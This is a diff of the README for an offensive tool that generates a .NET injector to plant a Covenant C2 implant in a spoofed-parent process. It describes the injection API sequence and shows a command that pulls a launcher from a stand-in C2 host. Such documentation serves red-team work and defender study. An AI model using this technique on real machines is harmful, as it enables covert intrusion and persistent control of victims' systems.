@@ -12,7 +12,7 @@ Clone this repository.
 git clone https://github.com/tgihf/covenant-grunt-injection.git
 ```
 
-The script uses `csc.exe` to compile the Grunt injector. If you'll be targeting machines with `csc.exe` for .NET 3.5, make sure you have .NET 3.5 installed. If you'll be targeting machines with csc.exe for .NET 4.0 installed, make sure you have .NET 4.0 installed.
+The script uses `csc.exe` to compile the Grunt injector which is executed on the target machine. If you'll be targeting machines that only have .NET 3.5 installed, make sure you have .NET 3.5 and its `csc.exe` installed. If you'll be targeting machines that only have .NET 4.0 installed, make sure you have .NET 4.0 and its `csc.exe` installed. For best results, just install both!
 
 ## Usage
 
@@ -26,7 +26,7 @@ Run `Generate-GruntInjector` with the URL the Binary Launcher is hosted on, the 
 
 ![](gif/generate-grunt-injector.gif)
 
-This produces a Grunt injector, which by default is named `GruntInjector_<timestamp>_v<.NET Framework version>.exe`. This .NET assembly injects a Grunt into an new, arbitrary process with an arbitrary PPID. 
+This produces a Grunt injector, which by default is named `GruntInjector_<timestamp>_v<.NET Framework version>.exe`. This .NET assembly injects a Grunt into an new, arbitrary process with an arbitrary PPID. Details on the process injection technique used can be found in the **Links** section of this README.
 
 Check which processes are running on the target with your functional Grunt. I'll be using the PID of this `powershell.exe` process as my PPID.
 
@@ -104,7 +104,7 @@ Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -Outfile 
 
 ## Links
 
-This project is merely an automation of [Rasta Mouse's](https://rastamouse.me) [Covenant/Donut process injection technique](https://rastamouse.me/2019/08/covenant-donut-tikitorch/). All creds to him for doing the heavy thinking!
+This project is merely an automation of [Rasta Mouse's](https://rastamouse.me) [Covenant/Donut process injection technique](https://rastamouse.me/2019/08/covenant-donut-tikitorch/). All creds to him for doing the heavy thinking! His technique for process injection involves unmanaged calls to `CreateProcess`, `InitializeProcThreadAttributeList`, `UpdateProcThreadAttribute`, `DeleteProcThreadAttributeList`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualAllocEx`, and `CreateRemoteThread`. The C# source code for the injector is embedded within Generate-GruntInjector and can be found in Rasta Mouse's blog post above.
 
 The project relies heavily on [Donut](https://github.com/TheWover/donut), a phenomenal project that allows us to convert the Grunt launcher .NET assembly into position-independent shellcode. Thank you, [TheWover](https://thewover.github.io) and [Odzhan](https://modexp.wordpress.com)!
 
